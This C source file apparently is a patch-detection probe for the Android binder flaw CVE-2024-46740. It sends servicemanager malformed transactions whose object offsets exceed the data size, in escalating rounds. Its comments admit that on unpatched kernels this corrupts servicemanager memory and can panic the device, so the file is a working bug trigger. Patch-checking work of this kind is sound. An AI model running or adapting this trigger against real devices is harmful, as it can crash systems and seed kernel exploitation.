/**
 * binder_46740_probe.c — CVE-2024-46740 运行时判别（非利用）
 *
 * 判别逻辑：向 context manager(handle 0) 发 TF_ONE_WAY BC_TRANSACTION，
 *   data_size 小、offsets[0] = object_offset > data_size。
 *   - 已修（fix 加入 object_offset > tr->data_size 检查）：copy 前即拒绝，
 *     不写 target buffer → 每轮干净返回错误，进程存活，控制事务正常。
 *   - 未修：raw-data gap copy 会越过 data 段写进 offsets/相邻区
 *     （recipient = servicemanager 的 binder_alloc），随后 binder_get_object
 *     失败走 unwinding；可能损坏 servicemanager 甚至 panic。
 *
 * 偏移量分级递增：{0x18, 0x40, 0x100, 0x800, 0x2000}；每轮之间跑一次
 * 零对象控制事务检查 binder 存活。任何一轮进程死亡 / ioctl 异常 /
 * 控制事务失败 => 判定倾向「未修」；全程干净 => 判定倾向「已修」。
 *
 * 风险提示：若内核未修，第 1 轮即可能破坏 servicemanager binder 区，
 * 可能需要重启设备。单进程、不循环放大、无 root。
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <signal.h>
#include <unistd.h>

#define BINDER_IOC(dir, nr, sz) \
  (((dir) << 30) | ((sz) << 16) | (('b') << 8) | (nr))
#define BINDER_WRITE_READ BINDER_IOC(3, 1, 48)
#define BINDER_VERSION BINDER_IOC(3, 9, 4)
#define BINDER_SET_MAX_THREADS BINDER_IOC(1, 5, 4)
#define BINDER_THREAD_EXIT BINDER_IOC(0, 8, 0)

#define BC_TRANSACTION 0x40406300u

struct binder_write_read {
  uint64_t write_size;
  uint64_t write_consumed;
  uint64_t write_buffer;
  uint64_t read_size;
  uint64_t read_consumed;
  uint64_t read_buffer;
};

struct binder_transaction_data {
  uint32_t target_handle;
  uint32_t pad0;
  uint64_t cookie;
  uint32_t code;
  uint32_t flags;
  int32_t sender_pid;
  uint32_t sender_euid;
  uint64_t data_size;
  uint64_t offsets_size;
  uint64_t data_buffer;
  uint64_t data_offsets;
};

static const char *br_name(uint32_t cmd) {
  switch (cmd) {
  case 0x00007201: return "BR_ERROR";
  case 0x00007202: return "BR_OK";
  case 0x00007203: return "BR_TRANSACTION";
  case 0x00007204: return "BR_REPLY";
  case 0x00007205: return "BR_ACQUIRE_RESULT";
  case 0x00007206: return "BR_DEAD_REPLY";
  case 0x00007207: return "BR_TRANSACTION_COMPLETE";
  case 0x0000720c: return "BR_NOOP";
  case 0x00007212: return "BR_FAILED_REPLY";
  default: return "?";
  }
}

static int do_txn(int fd, uint32_t target_handle, uint32_t tflags,
                  uint8_t *data, uint64_t data_size, const uint64_t *offsets,
                  uint64_t offsets_size, int is_malformed, uint8_t *readbuf,
                  size_t readbuf_sz, struct binder_write_read *bwr_out) {
  /* binder_thread_write expects: [u32 BC_TRANSACTION][binder_transaction_data]
   * i.e. struct starts right after the 4-byte command. */
  uint8_t *writebuf = malloc(4 + sizeof(struct binder_transaction_data));
  if (!writebuf) return -1;
  memset(writebuf, 0, 4 + sizeof(struct binder_transaction_data));
  *(uint32_t *)writebuf = BC_TRANSACTION;
  struct binder_transaction_data *tr =
      (struct binder_transaction_data *)(writebuf + 4);
  tr->target_handle = target_handle; /* context manager for 0 */
  tr->code = 1;
  tr->flags = tflags;
  tr->data_size = data_size;
  tr->offsets_size = offsets_size;
  tr->data_buffer = (uint64_t)(uintptr_t)data;
  tr->data_offsets = (uint64_t)(uintptr_t)offsets;

  struct binder_write_read bwr;
  memset(&bwr, 0, sizeof(bwr));
  bwr.write_size = 4 + sizeof(struct binder_transaction_data);
  bwr.write_buffer = (uint64_t)(uintptr_t)writebuf;
  bwr.read_size = readbuf_sz;
  bwr.read_buffer = (uint64_t)(uintptr_t)readbuf;
  memset(readbuf, 0, readbuf_sz);

  errno = 0;
  int r = ioctl(fd, BINDER_WRITE_READ, &bwr);
  int e = errno;
  printf("  [%s] WRITE_READ ret=%d errno=%d(%s) wcons=%llu rcons=%llu\n",
         is_malformed ? "malformed" : "control", r, r < 0 ? e : 0,
         r < 0 ? strerror(e) : "OK",
         (unsigned long long)bwr.write_consumed,
         (unsigned long long)bwr.read_consumed);
  if (bwr_out) *bwr_out = bwr;

  size_t consumed = (size_t)bwr.read_consumed;
  if (consumed > readbuf_sz) consumed = readbuf_sz;
  size_t off = 0;
  int ncmd = 0;
  while (off + 4 <= consumed && ncmd < 16) {
    uint32_t cmd = 0;
    memcpy(&cmd, readbuf + off, 4);
    printf("    BR 0x%08x %s\n", cmd, br_name(cmd));
    ncmd++;
    if (cmd == 0x00007201 && off + 8 <= consumed) {
      int32_t err = 0;
      memcpy(&err, readbuf + off + 4, 4);
      printf("      BR_ERROR=%d\n", err);
      off += 8;
      continue;
    }
    if (cmd == 0x80407203 || cmd == 0x80407204) {
      off += 4 + 0x40; /* BR_TRANSACTION/REPLY: cmd + 64B payload (sized_t) */
      continue;
    }
    off += 4;
  }
  free(writebuf);
  return r;
}

int main(void) {
  printf("binder_46740_probe pid=%d — object_offset > data_size rounds\n",
         getpid());
  fflush(stdout);

  int fd = open("/dev/binder", O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    printf("open /dev/binder errno=%d (%s)\n", errno, strerror(errno));
    return 1;
  }

  int32_t proto = 0;
  ioctl(fd, BINDER_VERSION, &proto);
  printf("BINDER_VERSION proto=%d\n", proto);
  uint32_t mt = 2;
  ioctl(fd, BINDER_SET_MAX_THREADS, &mt);

  void *map = mmap(NULL, 0x100000, PROT_READ, MAP_PRIVATE, fd, 0);
  if (map == MAP_FAILED) {
    printf("mmap FAIL errno=%d (%s)\n", errno, strerror(errno));
    return 1;
  }
  printf("mmap OK\n");

  /* readable data area: enough that an unpatched gap-copy can succeed reading */
  uint8_t *data = mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                       MAP_ANON | MAP_PRIVATE, -1, 0);
  if (data == MAP_FAILED) {
    printf("data mmap FAIL errno=%d\n", errno);
    return 1;
  }
  memset(data, 0x41, 0x10000);

  static const uint64_t big_offsets[] = {0x18, 0x40, 0x100, 0x800, 0x2000};
  uint8_t readbuf[512];

  /* reachability + fix check: synchronous call (flags=0) surfaces the error
   * path to the caller; alarm guards against an indefinite wait. */
  printf("== sync round object_offset=0x40 data_size=0x10 (flags=0) ==\n");
  fflush(stdout);
  uint64_t s_off[1] = {0x40};
  alarm(6);
  int sr = do_txn(fd, 0, 0, data, 0x10, s_off, sizeof(s_off), 1, readbuf,
                  sizeof(readbuf), NULL);
  alarm(0);
  printf("sync malformed ret=%d\n", sr);
  fflush(stdout);

  for (size_t i = 0; i < sizeof(big_offsets) / sizeof(big_offsets[0]); i++) {
    uint64_t offval = big_offsets[i];
    uint64_t offsets[1] = {offval};
    printf("== round %zu object_offset=0x%llx data_size=0x10 ==\n", i,
           (unsigned long long)offval);
    fflush(stdout);
    struct binder_write_read bwr;
    int r = do_txn(fd, 0, 0x01, data, 0x10, offsets, sizeof(offsets), 1,
                   readbuf, sizeof(readbuf), &bwr);
    /* control: zero-object valid-shaped txn */
    int rc = do_txn(fd, 0, 0x01, data, 0x8, NULL, 0, 0, readbuf,
                    sizeof(readbuf), NULL);
    if (r < 0 || rc < 0) {
      printf("FAILED at round %zu r=%d rc=%d — binder 疑似损坏\n", i, r, rc);
      return 2;
    }
    usleep(20000);
  }

  printf("ALL ROUNDS DONE — KERNEL/BINDER SURVIVED (倾向已修)\n");
  ioctl(fd, BINDER_THREAD_EXIT, NULL);
  munmap(map, 0x100000);
  munmap(data, 0x10000);
  close(fd);
  return 0;
}
